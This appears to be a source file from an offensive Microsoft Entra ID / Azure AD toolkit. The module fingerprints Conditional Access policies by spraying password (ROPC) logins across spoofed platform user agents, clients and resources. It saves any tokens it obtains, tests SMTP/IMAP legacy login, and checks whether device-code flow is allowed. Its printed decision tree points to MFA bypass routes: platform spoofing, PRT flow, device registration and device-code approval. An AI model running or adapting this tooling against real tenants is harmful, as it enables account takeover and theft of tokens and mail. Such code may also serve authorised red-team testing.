"""Module 1: Recon & CA policy fingerprinting.

Probes ROPC across platform UAs x clients x resources, records the error code for each,
and builds a CA policy matrix. Also does a quick legacy-auth probe and device-code check.
Output drives the GOAL.md decision tree (consumed by `auto`).

Scope note (GOAL "What NOT to build"): the FOCI family is uniform, so we probe 3 clients,
not 12. Platform is the axis that matters -- that's where the bypass lives.
"""
import smtplib
import imaplib

import requests

from lib import clients, errors, ua
from lib.logger import logged_session, get as get_log
from lib.oauth import ropc_v1, device_code_start
from lib.util import decode_jwt, now_iso

# Focused resource set: the ones worth knowing CA posture for.
RECON_RESOURCES = ["graph", "exchange", "drs", "azure_mgmt", "sharepoint"]


def _classify(status, body):
    if status == 200 and "access_token" in body:
        return "200"
    code = errors.parse_code(body.get("error_description") or str(body.get("error_codes") or body))
    return code or f"http_{status}"


def run(cfg, eng, args):
    print(f"[recon] Fingerprinting CA for {cfg.username} @ {cfg.tenant_id}")
    if not cfg.password:
        print("[recon] No password in config; ROPC matrix skipped. Set password or AZCA_PASSWORD env.")
        matrix = {}
    else:
        quick = getattr(args, "quick", False)
        sweep = getattr(args, "sweep", False)
        all_clients = getattr(args, "all_clients", False)

        if sweep:
            # Full CA-exemption resource sweep (PROTOCOLS section 8): the whole resource DB.
            platforms = ["windows"] + ua.BYPASS_PLATFORMS  # baseline + bypass candidates
            probe_clients = list(clients.CLIENTS) if all_clients else ["office"]
            resource_items = [(label, uri) for uri, label in clients.SWEEP_RESOURCES]
        elif quick:
            platforms = ["windows", "macos", "ios"]
            probe_clients = ["office"]
            resource_items = [(r, clients.v1_resource(r, cfg.sharepoint_host)) for r in ["graph", "drs"]]
        else:
            platforms = ua.ALL_PLATFORMS
            probe_clients = clients.ROPC_PROBE if not all_clients else list(clients.CLIENTS)
            resource_items = [(r, clients.v1_resource(r, cfg.sharepoint_host)) for r in RECON_RESOURCES]

        n = len(platforms) * len(probe_clients) * len(resource_items)
        mode = "SWEEP" if sweep else ("QUICK" if quick else "FULL")
        print(f"[recon] {mode} matrix: {len(platforms)} platforms x {len(probe_clients)} clients x "
              f"{len(resource_items)} resources = {n} auth attempts")
        matrix = _ropc_matrix(cfg, eng, platforms, probe_clients, resource_items)

    legacy = _legacy_probe(cfg)
    devcode = _device_code_probe(cfg)
    summary = _summarize(matrix, legacy, devcode)
    surface = _resource_surface(matrix)

    result = {"captured_at": now_iso(), "tenant_id": cfg.tenant_id, "username": cfg.username,
              "matrix": matrix, "legacy": legacy, "device_code": devcode,
              "summary": summary, "resource_surface": surface}
    eng.save_json("evidence", "recon", result)
    _print_summary(summary)
    _print_surface(surface)
    return summary


def _ropc_matrix(cfg, eng, platforms, probe_clients, resource_items):
    matrix = {}
    for platform in platforms:
        ua_str = ua.get(platform)
        matrix[platform] = {}
        for client_name in probe_clients:
            cid = clients.client_id(client_name)
            matrix[platform][client_name] = {}
            session = logged_session("recon")
            for res_name, resource in resource_items:
                log = get_log()
                log.info(f"[recon] Probing {platform}/{client_name}/{res_name} ...")
                try:
                    status, body = ropc_v1(session, cfg.tenant_id, cid, cfg.username,
                                           cfg.password, resource, ua=ua_str)
                    code = _classify(status, body)
                except requests.RequestException as e:
                    code = f"neterr:{type(e).__name__}"
                    body = {}
                meaning = errors.explain(code).get("meaning", "") if code not in ("200",) else "TOKEN"
                log.info(f"[recon]   -> {code} {meaning}")
                matrix[platform][client_name][res_name] = code
                if code == "200":
                    # Save the token immediately -- it's a direct win.
                    tok = dict(body)
                    tok.update({"tenant_id": cfg.tenant_id, "upn": cfg.username,
                                "source": "gatecrash", "captured_at": now_iso(),
                                "_meta": {"platform": platform, "client": client_name, "resource": res_name}})
                    try:
                        tok["upn"] = decode_jwt(body["access_token"]).get("upn", cfg.username)
                    except Exception:
                        pass
                    slug = res_name.lower().replace(" ", "_").replace("/", "_").replace("(", "").replace(")", "")
                    eng.save_token(f"recon_{slug}_{platform}", tok)
                    if res_name in ("graph", "MS Graph"):
                        eng.save_token("graph", tok)
                    if res_name == "DRS":
                        eng.save_token("drs", tok)
            # Save after each client batch (resume-friendly).
            eng.save_json("evidence", "recon_partial", matrix)
    return matrix


def _legacy_probe(cfg):
    """Quick SMTP/IMAP legacy-auth check. One shot each; don't build elaborate chains."""
    out = {"smtp": "skipped", "imap": "skipped"}
    if not cfg.password:
        return out
    try:
        s = smtplib.SMTP("smtp.office365.com", 587, timeout=15)
        s.starttls()
        s.login(cfg.username, cfg.password)
        s.quit()
        out["smtp"] = "AUTH_SUCCESS (legacy enabled!)"
    except smtplib.SMTPAuthenticationError:
        out["smtp"] = "auth_failed (legacy disabled)"
    except Exception as e:
        out["smtp"] = f"error:{type(e).__name__}"
    try:
        im = imaplib.IMAP4_SSL("outlook.office365.com", timeout=15)
        im.login(cfg.username, cfg.password)
        im.logout()
        out["imap"] = "AUTH_SUCCESS (legacy enabled!)"
    except imaplib.IMAP4.error:
        out["imap"] = "auth_failed (legacy disabled)"
    except Exception as e:
        out["imap"] = f"error:{type(e).__name__}"
    return out


def _device_code_probe(cfg):
    """Test if device-code flow is allowed (separate auth path, often not covered by CA)."""
    log = get_log()
    log.info("[recon] Probing device-code flow...")
    out = {}
    session = logged_session("recon-devcode")
    for cname in ("office", "azure_cli"):
        cid = clients.client_id(cname)
        for scope_name in ("graph", "exchange"):
            scope = clients.v2_scope(scope_name, cfg.sharepoint_host)
            try:
                status, body = device_code_start(session, cid, scope, cfg.tenant_id)
                if status == 200 and body.get("user_code"):
                    tag = f"{cname}/{scope_name}"
                    out[tag] = "ALLOWED"
                    log.info(f"[recon]   device-code {tag}: ALLOWED (user_code={body['user_code']})")
                else:
                    code = errors.parse_code(body.get("error_description", "")) or str(status)
                    out[f"{cname}/{scope_name}"] = code
                    log.info(f"[recon]   device-code {cname}/{scope_name}: {code}")
            except Exception as e:
                out[f"{cname}/{scope_name}"] = f"error:{type(e).__name__}"
    return out


def _summarize(matrix, legacy, devcode=None):
    direct, bypass_platforms, blocked, invalid = [], [], False, False
    for platform, by_client in matrix.items():
        for client_name, by_res in by_client.items():
            for res_name, code in by_res.items():
                if code == "200":
                    direct.append(f"{platform}/{client_name}/{res_name}")
                elif code == "50076":
                    if platform not in bypass_platforms:
                        bypass_platforms.append(platform)
                elif code in ("53003", "530003", "530084"):
                    blocked = True
                elif code in ("50126", "50034"):
                    invalid = True
    # Prefer macOS/iOS/Android ordering for bypass attempts.
    bypass_platforms.sort(key=lambda p: ua.BYPASS_PLATFORMS.index(p) if p in ua.BYPASS_PLATFORMS else 99)
    # Check for client-specific CA gaps (FOCI sweep finding)
    client_gaps = []
    for platform, by_client in matrix.items():
        for client_name, by_res in by_client.items():
            for res_name, code in by_res.items():
                if code in ("200", "50076") and client_name not in ("office", "teams", "azure_cli"):
                    tag = f"{client_name}/{res_name} on {platform}"
                    if tag not in client_gaps:
                        client_gaps.append(tag)

    devcode_allowed = [k for k, v in (devcode or {}).items() if v == "ALLOWED"]

    return {"direct_token": bool(direct), "direct_combos": direct,
            "bypass_platforms": bypass_platforms, "all_blocked": blocked and not bypass_platforms,
            "invalid_creds": invalid and not direct and not bypass_platforms,
            "legacy_enabled": any("SUCCESS" in v for v in legacy.values()),
            "client_gaps": client_gaps,
            "device_code_allowed": devcode_allowed}


def _resource_surface(matrix):
    """Per-resource CA posture across platforms: where it's MFA-only (50076), direct (200), blocked."""
    surface = {}
    for platform, by_client in matrix.items():
        for client_name, by_res in by_client.items():
            for res_name, code in by_res.items():
                s = surface.setdefault(res_name, {"direct_on": [], "mfa_only_on": [], "blocked_on": [], "codes": {}})
                s["codes"][f"{platform}/{client_name}"] = code
                tag = f"{platform}/{client_name}"
                if code == "200":
                    s["direct_on"].append(tag)
                elif code == "50076":
                    s["mfa_only_on"].append(tag)
                elif code in ("53003", "530003", "530084"):
                    s["blocked_on"].append(tag)
    return surface


def _print_surface(surface):
    exploitable = {r: s for r, s in surface.items() if s["direct_on"] or s["mfa_only_on"]}
    if not exploitable:
        return
    print("\n[recon] === Exploitable resource surface (direct / MFA-only) ===")
    for res, s in sorted(exploitable.items(), key=lambda kv: (-len(kv[1]["direct_on"]), -len(kv[1]["mfa_only_on"]))):
        bits = []
        if s["direct_on"]:
            bits.append(f"DIRECT(200): {', '.join(sorted(set(p.split('/')[0] for p in s['direct_on'])))}")
        if s["mfa_only_on"]:
            bits.append(f"MFA-only(50076): {', '.join(sorted(set(p.split('/')[0] for p in s['mfa_only_on'])))}")
        print(f"  {res}: {' | '.join(bits)}")


def _print_summary(s):
    print("\n[recon] === Decision ===")
    if s["invalid_creds"]:
        print("  Creds invalid or user missing (50126/50034). Stop.")
    elif s["direct_token"]:
        print(f"  DIRECT TOKEN available: {', '.join(s['direct_combos'][:5])}")
        print("  -> run: enumerate")
    elif s["bypass_platforms"]:
        print(f"  PLATFORM BYPASS (50076, MFA-only) on: {', '.join(s['bypass_platforms'])}")
        print(f"  -> run: bypass --method selenium-{s['bypass_platforms'][0]}  (or prt-flow)")
    elif s["all_blocked"]:
        print("  All combos blocked by CA (53003). No platform bypass.")
        print("  -> try: device-reg + prt-flow + drs")
    if s["legacy_enabled"]:
        print("  LEGACY AUTH ENABLED -> direct mailbox access possible.")
    if s.get("client_gaps"):
        print(f"  CLIENT-SPECIFIC CA GAPS: {', '.join(s['client_gaps'][:8])}")
        print("    (CA policy does not cover all first-party apps equally)")
    if s.get("device_code_allowed"):
        print(f"  DEVICE CODE FLOW ALLOWED: {', '.join(s['device_code_allowed'])}")
        print("    -> run: separate device-code auth (user approves on another device, bypasses local CA)")
